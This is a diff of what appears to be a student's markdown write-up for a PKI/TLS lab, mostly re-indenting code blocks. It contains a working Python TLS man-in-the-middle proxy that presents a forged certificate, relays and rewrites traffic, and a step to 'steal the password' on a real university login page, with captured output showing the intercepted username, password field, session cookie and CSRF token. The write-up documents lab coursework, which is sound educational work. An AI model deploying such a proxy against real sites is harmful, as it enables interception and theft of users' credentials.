@@ -662,11 +662,10 @@ ssl.SSLCertVerificationError: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verif
 
 ## Task 2.b: Testing the server program using browsers
 
-## Task 2.c: Certificate with multiple names
-
 - Append `10.9.0.43   www.pinto2022.com` to the `/etc/hosts` file in host machine.
 - Open Firefox, enter `about:preferences#privacy` > View Certificates > Authorities tab > Import CA certificate > Check "Trust this CA to identify websites".
 - With the `server.py` script running in the server container, access https://pinto2022.com.
+## Task 2.c: Certificate with multiple names
 
 - Use `server_openssl.cnf` to set up multiple names for the `pinto2022` website. We then change the `CA_openssl.cnf` file in the `copy_extensions` field to copy the extension field from the certificate signing request into the final certificate (disabled by default). Then, we use the run `gen_cert_multiple_names.sh`. Then we copy the generated certificates into the `server-certs/` folder.
 - Then we update the hosts `/etc/hosts` file with the new domain entries.
@@ -725,6 +724,7 @@ while True:
         continue
 ```
 
+- Rerun `server.py`.
 - Open the browser and test all the domains above.
 
 # Task 3: A Simple HTTPS Proxy
@@ -737,7 +737,7 @@ while True:
 
 This simulates the existence of a proxy because the traffic for `www.pinto2022.com` will be redirected through `10.9.0.143`.
 
-- Add `nameserver   8.8.8.8` to the `/etc/hosts` in the **proxy** container.
+- Add `nameserver   8.8.8.8` to the `/etc/resolv.conf` in the **proxy** container.
 
 - **Launch the MITM attack against your own server.**
   - Add `10.9.0.43  www.pinto2022.com` to the `/etc/hosts/` of the **proxy** container.
@@ -747,288 +747,278 @@ This simulates the existence of a proxy because the traffic for `www.pinto2022.c
   
   - `proxy.py`
   
-  ```python3
-  #!/usr/bin/env python3
+```python3
+#!/usr/bin/env python3
 
-  import socket
-  import ssl
-  import pprint
-  import threading
+import socket
+import ssl
+import pprint
+import threading
 
-  def process_request(ssock_for_browser):
-      hostname = "www.pinto2022.com"
+def process_request(ssock_for_browser):
+    hostname = "www.pinto2022.com"
 
-      # Make a connection to the real server
-      context_client = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)  # For Ubuntu 20.04 VM
-      # context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)      # For Ubuntu 16.04 VM
-      
-      cadir = './client-certs'
-      context_client.load_verify_locations(capath=cadir)
-      context_client.verify_mode = ssl.CERT_REQUIRED
-      context_client.check_hostname = True
-      sock_for_server = socket.create_connection((hostname, 443))
-      ssock_for_server = context_client.wrap_socket(
-          sock_for_server,
-          server_hostname=hostname,
-          do_handshake_on_connect=False
-      )
-      
-      ssock_for_server.do_handshake() 
-      request = ssock_for_browser.recv(2048)
-      pprint.pprint("Request: {}".format(request))
-      if request:
-          # Forward request to server
-          ssock_for_server.sendall(request)
+    # Make a connection to the real server
+    context_client = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)  # For Ubuntu 20.04 VM
+    # context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)      # For Ubuntu 16.04 VM
+    
+    cadir = './client-certs'
+    context_client.load_verify_locations(capath=cadir)
+    context_client.verify_mode = ssl.CERT_REQUIRED
+    context_client.check_hostname = True
+    sock_for_server = socket.create_connection((hostname, 443))
+    ssock_for_server = context_client.wrap_socket(
+        sock_for_server,
+        server_hostname=hostname,
+        do_handshake_on_connect=False
+    )
+    
+    ssock_for_server.do_handshake() 
+    request = ssock_for_browser.recv(2048)
+    pprint.pprint("Request: {}".format(request))
+    if request:
+        # Forward request to server
+        ssock_for_server.sendall(request)
 
-          # Get response from server, and forward it to browser
-          response = ssock_for_server.recv(2048)
-          response = response.replace(b"Bank32", b"FEUP22")
-          while response:
-              ssock_for_browser.sendall(response) # Forward to browser
-              response = ssock_for_server.recv(2048)
-              response = response.replace(b"Bank32", b"FEUP22")
-              
-      ssock_for_browser.shutdown(socket.SHUT_RDWR)
-      ssock_for_browser.close()
+        # Get response from server, and forward it to browser
+        response = ssock_for_server.recv(2048)
+        response = response.replace(b"Bank32", b"FEUP22")
+        while response:
+            ssock_for_browser.sendall(response) # Forward to browser
+            response = ssock_for_server.recv(2048)
+            response = response.replace(b"Bank32", b"FEUP22")
+            
+    ssock_for_browser.shutdown(socket.SHUT_RDWR)
+    ssock_for_browser.close()
 
-  html = """
-  HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n
-  <!DOCTYPE html><html><body><h1>This is Bank32.com!</h1></body></html>
-  """
-
-  # SERVER_CERT = './server-certs/mycert.crt'
-  # SERVER_PRIVATE = './server-certs/mycert.key'
-  SERVER_CERT = './server-certs/mycert_multiple.crt'
-  SERVER_PRIVATE = './server-certs/mycert_multiple.key'
+# SERVER_CERT = './server-certs/mycert.crt'
+# SERVER_PRIVATE = './server-certs/mycert.key'
+SERVER_CERT = './server-certs/mycert_multiple.crt'
+SERVER_PRIVATE = './server-certs/mycert_multiple.key'
 
 
-  context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)  # For Ubuntu 20.04 VM
-  # context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)      # For Ubuntu 16.04 VM
-  context.load_cert_chain(SERVER_CERT, SERVER_PRIVATE)
+context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)  # For Ubuntu 20.04 VM
+# context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)      # For Ubuntu 16.04 VM
+context.load_cert_chain(SERVER_CERT, SERVER_PRIVATE)
 
-  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
-  sock.bind(('0.0.0.0', 443))
-  sock.listen(5)
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
+sock.bind(('0.0.0.0', 443))
+sock.listen(5)
 
-  while True:
-      sock_for_browser, fromaddr = sock.accept()
-      try:
-          ssock_for_browser = context.wrap_socket(sock_for_browser, server_side=True)
-          x = threading.Thread(target=process_request, args=(ssock_for_browser,))
-          x.start()
-          # print("TLS connection established")
-          # data = ssock_for_browser.recv(1024)              # Read data over TLS
-          # pprint.pprint("Request: {}".format(data))
-          # ssock_for_browser.sendall(html.encode('utf-8'))  # Send data over TLS
+while True:
+    sock_for_browser, fromaddr = sock.accept()
+    try:
+        ssock_for_browser = context.wrap_socket(sock_for_browser, server_side=True)
+        x = threading.Thread(target=process_request, args=(ssock_for_browser,))
+        x.start()
+        # print("TLS connection established")
+        # data = ssock_for_browser.recv(1024)              # Read data over TLS
+        # pprint.pprint("Request: {}".format(data))
+        # ssock_for_browser.sendall(html.encode('utf-8'))  # Send data over TLS
 
-          # ssock_for_browser.shutdown(socket.SHUT_RDWR)     # Close the TLS connection
-          # ssock_for_browser.close()
+        # ssock_for_browser.shutdown(socket.SHUT_RDWR)     # Close the TLS connection
+        # ssock_for_browser.close()
 
-      except Exception:
-          print("TLS connection fails")
-          continue
-  ```
+    except Exception:
+        print("TLS connection fails")
+        continue
+```
 
-  - `server.py`
+- `server.py`
 
-  ```python3
-  #!/usr/bin/env python3
+```python3
+#!/usr/bin/env python3
 
-  import socket
-  import ssl
-  import pprint
+import socket
+import ssl
+import pprint
 
-  html = """
-  HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n
-  <!DOCTYPE html><html><body><h1>This is Bank32.com!</h1></body></html>
-  """
+html = """
+HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n
+<!DOCTYPE html><html><body><h1>This is Bank32.com!</h1></body></html>
+"""
 
-  # SERVER_CERT = './server-certs/mycert.crt'
-  # SERVER_PRIVATE = './server-certs/mycert.key'
-  SERVER_CERT = './server-certs/mycert_multiple.crt'
-  SERVER_PRIVATE = './server-certs/mycert_multiple.key'
+# SERVER_CERT = './server-certs/mycert.crt'
+# SERVER_PRIVATE = './server-certs/mycert.key'
+SERVER_CERT = './server-certs/mycert_multiple.crt'
+SERVER_PRIVATE = './server-certs/mycert_multiple.key'
 
 
-  context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)  # For Ubuntu 20.04 VM
-  # context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)      # For Ubuntu 16.04 VM
-  context.load_cert_chain(SERVER_CERT, SERVER_PRIVATE)
+context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)  # For Ubuntu 20.04 VM
+# context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)      # For Ubuntu 16.04 VM
+context.load_cert_chain(SERVER_CERT, SERVER_PRIVATE)
 
-  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
-  sock.bind(('0.0.0.0', 443))
-  sock.listen(5)
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
+sock.bind(('0.0.0.0', 443))
+sock.listen(5)
 
-  while True:
-      newsock, fromaddr = sock.accept()
-      try:
-          ssock = context.wrap_socket(newsock, server_side=True)
-          print("TLS connection established")
-          data = ssock.recv(1024)              # Read data over TLS
-          pprint.pprint("Request: {}".format(data))
-          ssock.sendall(html.encode('utf-8'))  # Send data over TLS
+while True:
+    newsock, fromaddr = sock.accept()
+    try:
+        ssock = context.wrap_socket(newsock, server_side=True)
+        print("TLS connection established")
+        data = ssock.recv(1024)              # Read data over TLS
+        pprint.pprint("Request: {}".format(data))
+        ssock.sendall(html.encode('utf-8'))  # Send data over TLS
 
-          ssock.shutdown(socket.SHUT_RDWR)     # Close the TLS connection
-          ssock.close()
+        ssock.shutdown(socket.SHUT_RDWR)     # Close the TLS connection
+        ssock.close()
 
-      except Exception:
-          print("TLS connection fails")
-          continue
-  ```
+    except Exception:
+        print("TLS connection fails")
+        continue
+```
 
   - In the `proxy.py` code the `Bank32` string on every response gets replaced by `FEUP22`. This way we show our MITM agent is working.
 
 - **Launch the MITM attack on a real HTTPS website that has a login. Steal the password.**
-  - **Target:** https://wayf.up.pt/idp/profile/SAML2/Redirect/SSO?execution=e3s2
+  - **Target:** https://wayf.up.pt/idp/profile/SAML2/Redirect/SSO?execution=e1s2
   - Generate `wayf.up.pt` certificate by running `gen_cert_wayf.sh` and move the certificates to the `server-certs/` folder.
   - Append `/etc/hosts` in the Host Vm with `10.9.0.143      wayf.up.pt`.
   - Launch `proxy.py`
 
-  ```python3
-  #!/usr/bin/env python3
+```python3
+#!/usr/bin/env python3
 
-  import socket
-  import ssl
-  import pprint
-  import threading
+import socket
+import ssl
+import pprint
+import threading
 
-  def process_request(ssock_for_browser):
-      hostname = "wayf.up.pt"
+def process_request(ssock_for_browser):
+    hostname = "wayf.up.pt"
 
-      # Make a connection to the real server
-      context_client = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)  # For Ubuntu 20.04 VM
-      # context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)      # For Ubuntu 16.04 VM
-      
-      cadir = '/etc/ssl/certs'
-      context_client.load_verify_locations(capath=cadir)
-      context_client.verify_mode = ssl.CERT_REQUIRED
-      context_client.check_hostname = True
-      sock_for_server = socket.create_connection((hostname, 443))
-      ssock_for_server = context_client.wrap_socket(
-          sock_for_server,
-          server_hostname=hostname,
-          do_handshake_on_connect=False
-      )
-      
-      ssock_for_server.do_handshake() 
-      request = ssock_for_browser.recv(2048)
-      pprint.pprint("Request: {}".format(request))
-      if request:
-          # Forward request to server
-          ssock_for_server.sendall(request)
+    # Make a connection to the real server
+    context_client = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)  # For Ubuntu 20.04 VM
+    # context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)      # For Ubuntu 16.04 VM
+    
+    cadir = '/etc/ssl/certs'
+    context_client.load_verify_locations(capath=cadir)
+    context_client.verify_mode = ssl.CERT_REQUIRED
+    context_client.check_hostname = True
+    sock_for_server = socket.create_connection((hostname, 443))
+    ssock_for_server = context_client.wrap_socket(
+        sock_for_server,
+        server_hostname=hostname,
+        do_handshake_on_connect=False
+    )
+    
+    ssock_for_server.do_handshake() 
+    request = ssock_for_browser.recv(2048)
+    pprint.pprint("Request: {}".format(request))
+    if request:
+        # Forward request to server
+        ssock_for_server.sendall(request)
 
-          # Get response from server, and forward it to browser
-          response = ssock_for_server.recv(2048)
-          while response:
-              ssock_for_browser.sendall(response) # Forward to browser
-              response = ssock_for_server.recv(2048)
-              
-      ssock_for_browser.shutdown(socket.SHUT_RDWR)
-      ssock_for_browser.close()
+        # Get response from server, and forward it to browser
+        response = ssock_for_server.recv(2048)
+        while response:
+            ssock_for_browser.sendall(response) # Forward to browser
+            response = ssock_for_server.recv(2048)
+            
+    ssock_for_browser.shutdown(socket.SHUT_RDWR)
+    ssock_for_browser.close()
 
-  html = """
-  HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n
-  <!DOCTYPE html><html><body><h1>This is Bank32.com!</h1></body></html>
-  """
-
-  # SERVER_CERT = './server-certs/mycert.crt'
-  # SERVER_PRIVATE = './server-certs/mycert.key'
-  SERVER_CERT = './server-certs/wayf.crt'
-  SERVER_PRIVATE = './server-certs/wayf.key'
+# SERVER_CERT = './server-certs/mycert.crt'
+# SERVER_PRIVATE = './server-certs/mycert.key'
+SERVER_CERT = './server-certs/wayf.crt'
+SERVER_PRIVATE = './server-certs/wayf.key'
 
 
-  context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)  # For Ubuntu 20.04 VM
-  # context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)      # For Ubuntu 16.04 VM
-  context.load_cert_chain(SERVER_CERT, SERVER_PRIVATE)
+context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)  # For Ubuntu 20.04 VM
+# context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)      # For Ubuntu 16.04 VM
+context.load_cert_chain(SERVER_CERT, SERVER_PRIVATE)
 
-  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
-  sock.bind(('0.0.0.0', 443))
-  sock.listen(5)
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
+sock.bind(('0.0.0.0', 443))
+sock.listen(5)
 
-  while True:
-      sock_for_browser, fromaddr = sock.accept()
-      try:
-          ssock_for_browser = context.wrap_socket(sock_for_browser, server_side=True)
-          x = threading.Thread(target=process_request, args=(ssock_for_browser,))
-          x.start()
-          # print("TLS connection established")
-          # data = ssock_for_browser.recv(1024)              # Read data over TLS
-          # pprint.pprint("Request: {}".format(data))
-          # ssock_for_browser.sendall(html.encode('utf-8'))  # Send data over TLS
+while True:
+    sock_for_browser, fromaddr = sock.accept()
+    try:
+        ssock_for_browser = context.wrap_socket(sock_for_browser, server_side=True)
+        x = threading.Thread(target=process_request, args=(ssock_for_browser,))
+        x.start()
+        # print("TLS connection established")
+        # data = ssock_for_browser.recv(1024)              # Read data over TLS
+        # pprint.pprint("Request: {}".format(data))
+        # ssock_for_browser.sendall(html.encode('utf-8'))  # Send data over TLS
 
-          # ssock_for_browser.shutdown(socket.SHUT_RDWR)     # Close the TLS connection
-          # ssock_for_browser.close()
+        # ssock_for_browser.shutdown(socket.SHUT_RDWR)     # Close the TLS connection
+        # ssock_for_browser.close()
 
-      except Exception:
-          print("TLS connection fails")
-          continue
-  ```
+    except Exception:
+        print("TLS connection fails")
+        continue
+```
 
   - Credentials (CTRL + F `j_username=testusername&j_password=testpassword`) - Output from `proxy.py`:
 
-  ```
-  root@b43b6c7774cf:/volumes# python3 proxy.py 
-  Enter PEM pass phrase:
-  ("Request: b'GET /idp/profile/SAML2/Redirect/SSO?execution=e8s2 "
-  'HTTP/1.1\\r\\nHost: wayf.up.pt\\r\\nUser-Agent: Mozilla/5.0 (X11; Linux '
-  'x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\\r\\nAccept: '
-  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\\r\\nAccept-Language: '
-  'en-US,en;q=0.5\\r\\nAccept-Encoding: gzip, deflate, br\\r\\nReferer: '
-  'https://wayf.up.pt/idp/profile/SAML2/Redirect/SSO?execution=e8s1\\r\\nDNT: '
-  '1\\r\\nConnection: keep-alive\\r\\nCookie: '
-  'JSESSIONID=DD5BAE7AA71CEEF8674D5B82689951B4\\r\\nUpgrade-Insecure-Requests: '
-  '1\\r\\nSec-Fetch-Dest: document\\r\\nSec-Fetch-Mode: '
-  'navigate\\r\\nSec-Fetch-Site: same-origin\\r\\nSec-Fetch-User: '
-  "?1\\r\\nCache-Control: max-age=0\\r\\n\\r\\n'")
-  ("Request: b'GET /idp/images/logo_compete_final.png HTTP/1.1\\r\\nHost: "
-  'wayf.up.pt\\r\\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) '
-  'Gecko/20100101 Firefox/91.0\\r\\nAccept: '
-  'image/webp,*/*\\r\\nAccept-Language: en-US,en;q=0.5\\r\\nAccept-Encoding: '
-  'gzip, deflate, br\\r\\nDNT: 1\\r\\nConnection: keep-alive\\r\\nReferer: '
-  'https://wayf.up.pt/idp/profile/SAML2/Redirect/SSO?execution=e8s2\\r\\nCookie: '
-  'JSESSIONID=DD5BAE7AA71CEEF8674D5B82689951B4\\r\\nSec-Fetch-Dest: '
-  'image\\r\\nSec-Fetch-Mode: no-cors\\r\\nSec-Fetch-Site: '
-  'same-origin\\r\\nIf-Modified-Since: Thu, 05 May 2022 10:42:20 '
-  'GMT\\r\\nIf-None-Match: W/"4154-1651747340000"\\r\\nCache-Control: '
-  "max-age=0\\r\\n\\r\\n'")
-  ("Request: b'GET /idp/images/logo_autenticacao_final.png HTTP/1.1\\r\\nHost: "
-  'wayf.up.pt\\r\\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) '
-  'Gecko/20100101 Firefox/91.0\\r\\nAccept: '
-  'image/webp,*/*\\r\\nAccept-Language: en-US,en;q=0.5\\r\\nAccept-Encoding: '
-  'gzip, deflate, br\\r\\nDNT: 1\\r\\nConnection: keep-alive\\r\\nReferer: '
-  'https://wayf.up.pt/idp/profile/SAML2/Redirect/SSO?execution=e8s2\\r\\nCookie: '
-  'JSESSIONID=DD5BAE7AA71CEEF8674D5B82689951B4\\r\\nSec-Fetch-Dest: '
-  'image\\r\\nSec-Fetch-Mode: no-cors\\r\\nSec-Fetch-Site: '
-  'same-origin\\r\\nIf-Modified-Since: Thu, 05 May 2022 10:42:20 '
-  'GMT\\r\\nIf-None-Match: W/"3559-1651747340000"\\r\\nCache-Control: '
-  "max-age=0\\r\\n\\r\\n'")
-  ("Request: b'GET /idp/images/LogoAai.png HTTP/1.1\\r\\nHost: "
-  'wayf.up.pt\\r\\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) '
-  'Gecko/20100101 Firefox/91.0\\r\\nAccept: '
-  'image/webp,*/*\\r\\nAccept-Language: en-US,en;q=0.5\\r\\nAccept-Encoding: '
-  'gzip, deflate, br\\r\\nDNT: 1\\r\\nConnection: keep-alive\\r\\nCookie: '
-  'JSESSIONID=DD5BAE7AA71CEEF8674D5B82689951B4\\r\\nSec-Fetch-Dest: '
-  'image\\r\\nSec-Fetch-Mode: no-cors\\r\\nSec-Fetch-Site: '
-  "same-origin\\r\\n\\r\\n'")
-  ("Request: b'POST /idp/profile/SAML2/Redirect/SSO?execution=e8s2 "
-  'HTTP/1.1\\r\\nHost: wayf.up.pt\\r\\nUser-Agent: Mozilla/5.0 (X11; Linux '
-  'x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\\r\\nAccept: '
-  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\\r\\nAccept-Language: '
-  'en-US,en;q=0.5\\r\\nAccept-Encoding: gzip, deflate, br\\r\\nContent-Type: '
-  'application/x-www-form-urlencoded\\r\\nContent-Length: 118\\r\\nOrigin: '
-  'https://wayf.up.pt\\r\\nDNT: 1\\r\\nConnection: keep-alive\\r\\nReferer: '
-  'https://wayf.up.pt/idp/profile/SAML2/Redirect/SSO?execution=e8s2\\r\\nCookie: '
-  'JSESSIONID=DD5BAE7AA71CEEF8674D5B82689951B4\\r\\nUpgrade-Insecure-Requests: '
-  '1\\r\\nSec-Fetch-Dest: document\\r\\nSec-Fetch-Mode: '
-  'navigate\\r\\nSec-Fetch-Site: same-origin\\r\\nSec-Fetch-User: '
-  "?1\\r\\n\\r\\ncsrf_token=_feabaf136a0d1e77bce0fff4398886dec14bb199&j_username=testusername&j_password=testpassword&_eventId_proceed='")
-  ("Request: b'GET /idp/profile/SAML2/Redirect/SSO?execution=e8s3 "
-  'HTTP/1.1\\r\\nHost: wayf.up.pt\\r\\nUser-Agent: Mozilla/5.0 (X11; Linux '
-  'x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\\r\\nAccept: '
-  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\\r\\nAccept-Language: '
-  'en-US,en;q=0.5\\r\\nAccept-Encoding: gzip, deflate, br\\r\\nReferer: '
-  'https://wayf.up.pt/idp/profile/SAML2/Redirect/SSO?execution=e8s2\\r\\nDNT: '
-  '1\\r\\nConnection: keep-alive\\r\\nCookie: '
-  'JSESSIONID=DD5BAE7AA71CEEF8674D5B82689951B4\\r\\nUpgrade-Insecure-Requests: '
-  '1\\r\\nSec-Fetch-Dest: document\\r\\nSec-Fetch-Mode: '
-  'navigate\\r\\nSec-Fetch-Site: same-origin\\r\\nSec-Fetch-User: '
-  "?1\\r\\n\\r\\n'")
-  ```
+```
+root@b43b6c7774cf:/volumes# python3 proxy.py 
+Enter PEM pass phrase:
+("Request: b'GET /idp/profile/SAML2/Redirect/SSO?execution=e8s2 "
+'HTTP/1.1\\r\\nHost: wayf.up.pt\\r\\nUser-Agent: Mozilla/5.0 (X11; Linux '
+'x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\\r\\nAccept: '
+'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\\r\\nAccept-Language: '
+'en-US,en;q=0.5\\r\\nAccept-Encoding: gzip, deflate, br\\r\\nReferer: '
+'https://wayf.up.pt/idp/profile/SAML2/Redirect/SSO?execution=e8s1\\r\\nDNT: '
+'1\\r\\nConnection: keep-alive\\r\\nCookie: '
+'JSESSIONID=DD5BAE7AA71CEEF8674D5B82689951B4\\r\\nUpgrade-Insecure-Requests: '
+'1\\r\\nSec-Fetch-Dest: document\\r\\nSec-Fetch-Mode: '
+'navigate\\r\\nSec-Fetch-Site: same-origin\\r\\nSec-Fetch-User: '
+"?1\\r\\nCache-Control: max-age=0\\r\\n\\r\\n'")
+("Request: b'GET /idp/images/logo_compete_final.png HTTP/1.1\\r\\nHost: "
+'wayf.up.pt\\r\\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) '
+'Gecko/20100101 Firefox/91.0\\r\\nAccept: '
+'image/webp,*/*\\r\\nAccept-Language: en-US,en;q=0.5\\r\\nAccept-Encoding: '
+'gzip, deflate, br\\r\\nDNT: 1\\r\\nConnection: keep-alive\\r\\nReferer: '
+'https://wayf.up.pt/idp/profile/SAML2/Redirect/SSO?execution=e8s2\\r\\nCookie: '
+'JSESSIONID=DD5BAE7AA71CEEF8674D5B82689951B4\\r\\nSec-Fetch-Dest: '
+'image\\r\\nSec-Fetch-Mode: no-cors\\r\\nSec-Fetch-Site: '
+'same-origin\\r\\nIf-Modified-Since: Thu, 05 May 2022 10:42:20 '
+'GMT\\r\\nIf-None-Match: W/"4154-1651747340000"\\r\\nCache-Control: '
+"max-age=0\\r\\n\\r\\n'")
+("Request: b'GET /idp/images/logo_autenticacao_final.png HTTP/1.1\\r\\nHost: "
+'wayf.up.pt\\r\\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) '
+'Gecko/20100101 Firefox/91.0\\r\\nAccept: '
+'image/webp,*/*\\r\\nAccept-Language: en-US,en;q=0.5\\r\\nAccept-Encoding: '
+'gzip, deflate, br\\r\\nDNT: 1\\r\\nConnection: keep-alive\\r\\nReferer: '
+'https://wayf.up.pt/idp/profile/SAML2/Redirect/SSO?execution=e8s2\\r\\nCookie: '
+'JSESSIONID=DD5BAE7AA71CEEF8674D5B82689951B4\\r\\nSec-Fetch-Dest: '
+'image\\r\\nSec-Fetch-Mode: no-cors\\r\\nSec-Fetch-Site: '
+'same-origin\\r\\nIf-Modified-Since: Thu, 05 May 2022 10:42:20 '
+'GMT\\r\\nIf-None-Match: W/"3559-1651747340000"\\r\\nCache-Control: '
+"max-age=0\\r\\n\\r\\n'")
+("Request: b'GET /idp/images/LogoAai.png HTTP/1.1\\r\\nHost: "
+'wayf.up.pt\\r\\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) '
+'Gecko/20100101 Firefox/91.0\\r\\nAccept: '
+'image/webp,*/*\\r\\nAccept-Language: en-US,en;q=0.5\\r\\nAccept-Encoding: '
+'gzip, deflate, br\\r\\nDNT: 1\\r\\nConnection: keep-alive\\r\\nCookie: '
+'JSESSIONID=DD5BAE7AA71CEEF8674D5B82689951B4\\r\\nSec-Fetch-Dest: '
+'image\\r\\nSec-Fetch-Mode: no-cors\\r\\nSec-Fetch-Site: '
+"same-origin\\r\\n\\r\\n'")
+("Request: b'POST /idp/profile/SAML2/Redirect/SSO?execution=e8s2 "
+'HTTP/1.1\\r\\nHost: wayf.up.pt\\r\\nUser-Agent: Mozilla/5.0 (X11; Linux '
+'x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\\r\\nAccept: '
+'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\\r\\nAccept-Language: '
+'en-US,en;q=0.5\\r\\nAccept-Encoding: gzip, deflate, br\\r\\nContent-Type: '
+'application/x-www-form-urlencoded\\r\\nContent-Length: 118\\r\\nOrigin: '
+'https://wayf.up.pt\\r\\nDNT: 1\\r\\nConnection: keep-alive\\r\\nReferer: '
+'https://wayf.up.pt/idp/profile/SAML2/Redirect/SSO?execution=e8s2\\r\\nCookie: '
+'JSESSIONID=DD5BAE7AA71CEEF8674D5B82689951B4\\r\\nUpgrade-Insecure-Requests: '
+'1\\r\\nSec-Fetch-Dest: document\\r\\nSec-Fetch-Mode: '
+'navigate\\r\\nSec-Fetch-Site: same-origin\\r\\nSec-Fetch-User: '
+"?1\\r\\n\\r\\ncsrf_token=_feabaf136a0d1e77bce0fff4398886dec14bb199&j_username=testusername&j_password=testpassword&_eventId_proceed='")
+("Request: b'GET /idp/profile/SAML2/Redirect/SSO?execution=e8s3 "
+'HTTP/1.1\\r\\nHost: wayf.up.pt\\r\\nUser-Agent: Mozilla/5.0 (X11; Linux '
+'x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\\r\\nAccept: '
+'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\\r\\nAccept-Language: '
+'en-US,en;q=0.5\\r\\nAccept-Encoding: gzip, deflate, br\\r\\nReferer: '
+'https://wayf.up.pt/idp/profile/SAML2/Redirect/SSO?execution=e8s2\\r\\nDNT: '
+'1\\r\\nConnection: keep-alive\\r\\nCookie: '
+'JSESSIONID=DD5BAE7AA71CEEF8674D5B82689951B4\\r\\nUpgrade-Insecure-Requests: '
+'1\\r\\nSec-Fetch-Dest: document\\r\\nSec-Fetch-Mode: '
+'navigate\\r\\nSec-Fetch-Site: same-origin\\r\\nSec-Fetch-User: '
+"?1\\r\\n\\r\\n'")
+```
